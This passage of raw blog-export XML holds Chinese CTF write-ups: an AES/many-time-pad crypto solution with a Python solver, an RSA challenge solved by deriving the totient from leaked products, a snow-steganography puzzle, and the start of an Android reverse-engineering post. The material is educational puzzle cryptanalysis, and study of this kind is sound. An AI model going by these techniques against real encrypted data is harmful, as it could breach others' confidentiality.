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&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的代码是AES的ECB加密模式，明文按照16字节分组进行加密，输出key和密文，iv未知，需要还原明文。</p>
<p>使用MTU方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python3 </span></span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor <span class="keyword">as</span> xor </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo </span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isChr</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">infer</span>(<span class="params">index, pos</span>):</span>  </span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)  </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:  </span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>) </span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">know</span>(<span class="params">index, pos, ch</span>):</span>  </span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)  </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:  </span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch) </span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSpace</span>():</span>  </span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):  </span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]  </span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))  </span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]  </span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):  </span><br><span class="line">            dat.append((f(pos), index, pos)) </span><br><span class="line">            </span><br><span class="line">key = <span class="string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span> </span><br><span class="line">key = base64.b64decode(key)</span><br><span class="line">c=<span class="string">b&#x27;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&#x27;</span></span><br><span class="line"></span><br><span class="line">c = base64.b64decode(c) </span><br><span class="line">cipher=AES.new(key,mode=AES.MODE_ECB) </span><br><span class="line">t = [] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">16</span>):  </span><br><span class="line">     <span class="keyword">if</span> i == <span class="number">0</span>:  </span><br><span class="line">         t.append(cipher.decrypt(c[i:i+<span class="number">16</span>])) <span class="comment"># s1 ^ iv  </span></span><br><span class="line">     <span class="keyword">else</span>: </span><br><span class="line">         t.append(xor(cipher.decrypt(c[i:i + <span class="number">16</span>]), c[i-<span class="number">16</span>:i])) </span><br><span class="line">tmp = [] </span><br><span class="line">tmp.append(t[<span class="number">0</span>]) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(t)):  </span><br><span class="line">    tttt = t[i]  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, i):  </span><br><span class="line">        tttt = xor(tttt, t[j])  </span><br><span class="line">    tmp.append(tttt) <span class="comment"># si ^ iv </span></span><br><span class="line"><span class="comment"># MTP attack </span></span><br><span class="line">c = tmp </span><br><span class="line">dat = [] </span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>) </span><br><span class="line">getSpace() </span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>] </span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:  </span><br><span class="line">    infer(index, pos) </span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg])) </span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>-CTF -Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Crypto系列之初识RSA</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8B%E5%88%9D%E8%AF%86RSA/</url>
    <content><![CDATA[<h1 id="【攻防世界】Crypto系列之初识RSA"><a href="#【攻防世界】Crypto系列之初识RSA" class="headerlink" title="【攻防世界】Crypto系列之初识RSA"></a>【攻防世界】Crypto系列之初识RSA</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,inverse,getPrime</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line">pq = p*(q-<span class="number">1</span>)</span><br><span class="line">qp = q*(p-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pq=&quot;</span>,pq)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;qp=&quot;</span>,qp)</span><br><span class="line"><span class="built_in">print</span>(qp*pq)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c= 8722269075970644434253339592758512788160408912707387632591552130175707843950684315083250494010055435391879036285103810263591951437829414438640307561645721347859659807138051841516634704123100270651976676182059252251162982609391666023674158274992400910869692389001622774140191223807887675081808561012755545464977015973615407965906513878979919700065923364884766974187303774330319143647840846354404070430118235352622445115153298578370521811697710289716188726587743282814946239856766713516166990341116198180068191759095913957606379780234116317390622824096667107736103270907349927467971817639795094030622157581511033950777</span></span><br><span class="line"><span class="string">n= 10466186506773626671397261081802640650185744558208505628349249045496105597268556020207175016523119333667851114848452038431498926527983706092607207796937431312520131882751891731564121558651246025754915145600686076505962750195353958781726515647847167067621799990588328894365930423844435964506372428647802381074584935050067254029262890188260006596141011807724688556673520261743199388391094490191001701011230322653422314758778116196105077883955436582364267530633358016652912054880813710531145973799193443828969535902856467548523653920307742364119002349899553478815101092655897400295925170383678499125295006364960124859003</span></span><br><span class="line"><span class="string">pq= 10466186506773626671397261081802640650185744558208505628349249045496105597268556020207175016523119333667851114848452038431498926527983706092607207796937431312520131882751891731564121558651246025754915145600686076505962750195353958781726515647847167067621799990588328894365930423844435964506372428647802381074488896197029704465200125337817646702009123916866455067019234171839614862660036737875747177391796376553159880972782837853473250804807544086701088829096838316550146794766718580877976153967582795248676367265069623900208276878140709691073369415161936376086988069213820933152601453587292943483693378833664901178324</span></span><br><span class="line"><span class="string">qp= 10466186506773626671397261081802640650185744558208505628349249045496105597268556020207175016523119333667851114848452038431498926527983706092607207796937431312520131882751891731564121558651246025754915145600686076505962750195353958781726515647847167067621799990588328894365930423844435964506372428647802381074475956379708898904933143429835002718457573266164923043251954374464149976302585916538814746811455883837138715445492053610047383292461097590195481556557381952895539341802954749542143253491617052100969586396996063822508764438280468492894012685918249843558593322831683872737943676955669923498182824352081785243246</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对这个代码肯定不陌生，这就是一个RSA算法，但和前面的一道baigeiRS题目些许不一样的地方是这道题的数非常大，如果还用yafu工具去对n进行因式分解的话，我试了一下直接奔溃退出，所以还得从代码层面来解</p>
<p>我们来看下面三行代码,这是关键切入点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pq = p*(q-1)</span><br><span class="line">qp = q*(p-1)</span><br><span class="line">n = q*p</span><br></pre></td></tr></table></figure>

<p>根据欧拉函数定义可得</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">oula= qp* pq//n=(q-1)*(p-1)</span><br></pre></td></tr></table></figure>

<p>然后再根据欧拉函数计算得出e的逆向d</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d = inverse(e,oula)</span><br></pre></td></tr></table></figure>

<p>最后对c进行解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = pow(c,d,n)</span><br></pre></td></tr></table></figure>

<p>得出原来的明文数据为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">56006392793406543237791987142417311294065929320140616629889216443512551772328106378173698666811961469</span><br></pre></td></tr></table></figure>



<p>这里还需要调用long_to_bytes函数将数字转换为字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;719014b3-c4e1-4f81-a7be-b4f0d65c9e10&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>-CTF -Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Misc系列之snow隐写</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Misc%E7%B3%BB%E5%88%97%E4%B9%8Bsnow%E9%9A%90%E5%86%99/</url>
    <content><![CDATA[<h1 id="【攻防世界】Misc系列之snow隐写"><a href="#【攻防世界】Misc系列之snow隐写" class="headerlink" title="【攻防世界】Misc系列之snow隐写"></a>【攻防世界】Misc系列之snow隐写</h1><h2 id="题目前摇"><a href="#题目前摇" class="headerlink" title="题目前摇"></a>题目前摇</h2><p>打开附件是一个图像</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Misc%E7%B3%BB%E5%88%97%E4%B9%8Bsnow%E9%9A%90%E5%86%99/image-20231222210623468.png" class title="image-20231222210623468">

<p>CTF，MISC图片常规的隐写步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.首先：查看图片属性是否有可疑点。</span><br><span class="line"></span><br><span class="line">2.放入winhex查找信息。</span><br><span class="line"></span><br><span class="line">3.放入stegsolve查找信息。</span><br><span class="line"></span><br><span class="line">4.若是.png图片结尾还可放到tweakpng.exe，改变图片的大小。</span><br><span class="line"></span><br><span class="line">特殊思路：若是在常规步骤中，找不到信息，可能是题目或者是提示信息中找到隐秘的隐写方法</span><br></pre></td></tr></table></figure>

<p>只有在其属性中发现存在一串十六进制数</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Misc%E7%B3%BB%E5%88%97%E4%B9%8Bsnow%E9%9A%90%E5%86%99/image-20231222210917535.png" class title="image-20231222210917535">

<p>将其转换成字符串，代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">str = &quot;73,6e,6f,77,21,21,21&quot;</span><br><span class="line">s = str.split(&quot;,&quot;)</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in s:</span><br><span class="line">    flag+=chr(int(i,16))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>得到snow字符串</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Misc%E7%B3%BB%E5%88%97%E4%B9%8Bsnow%E9%9A%90%E5%86%99/image-20231222211158462.png" class title="image-20231222211158462">

<p>在CTF中压缩包还可能包含隐藏文件，使用7z工具去查看压缩包内容，如下</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Misc%E7%B3%BB%E5%88%97%E4%B9%8Bsnow%E9%9A%90%E5%86%99/image-20231222211140714.png" class title="image-20231222211140714">

<p>依次查看内容，前三个文件字符串拼接为”他朝若是同淋雪”，最后一个文件为字符串。与前面的snow结合在一起，推断出可能运用snow隐写，什么是snow隐写？</p>
<h2 id="snow隐写"><a href="#snow隐写" class="headerlink" title="snow隐写"></a>snow隐写</h2><p>snow隐写用于在行尾附加空格和制表符来隐藏ASCLL文本中的消息进行文本隐写，由于空格和制表符在文本查看器中通常不可见，因此消息实际上对不经意的观察者隐藏。</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Misc%E7%B3%BB%E5%88%97%E4%B9%8Bsnow%E9%9A%90%E5%86%99/image-20231222211721350.png" class title="image-20231222211721350">

<p>一般来说， SNOW 隐写主要运用在 HTML 文件（网页）中，所以 SNOW 隐写又被称为 HTML 隐写。</p>
<h2 id="题目解答"><a href="#题目解答" class="headerlink" title="题目解答"></a>题目解答</h2><p>前面的”他朝若是同淋雪”是密码，将上面隐藏的最后一个文件内容保存在text.txt文件中，使用snow工具对其进行解密</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Misc%E7%B3%BB%E5%88%97%E4%B9%8Bsnow%E9%9A%90%E5%86%99/image-20231222211955426.png" class title="image-20231222211955426">

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Sn0w_M@n!!!!!!!&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>-CTF -Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Moblie系列之Android2.0</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8BAndroid2.0/</url>
    <content><![CDATA[<h1 id="【攻防世界】Mobile系列之Android2-0"><a href="#【攻防世界】Mobile系列之Android2-0" class="headerlink" title="【攻防世界】Mobile系列之Android2.0"></a>【攻防世界】Mobile系列之Android2.0</h1><img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8BAndroid2.0/image-20231101103230399.png" class title="image-20231101103230399">

<p>反编译获取原代码，定义MainActivity类，找到判断关键代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">ublic <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.Show(JNI.getResult(MainActivity.<span class="keyword">this</span>.pwd.getText().toString()));</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>这里调用了JNI.getresult函数，跟进该函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNI</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">getResult</span><span class="params">(String str)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;Native&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里调用了Native层的so文件Native.so，我们使用IDA打开该文件，定位<strong>Java_com_example_test_ctf03_JNI_getResult</strong>反编译获取伪代码</p>
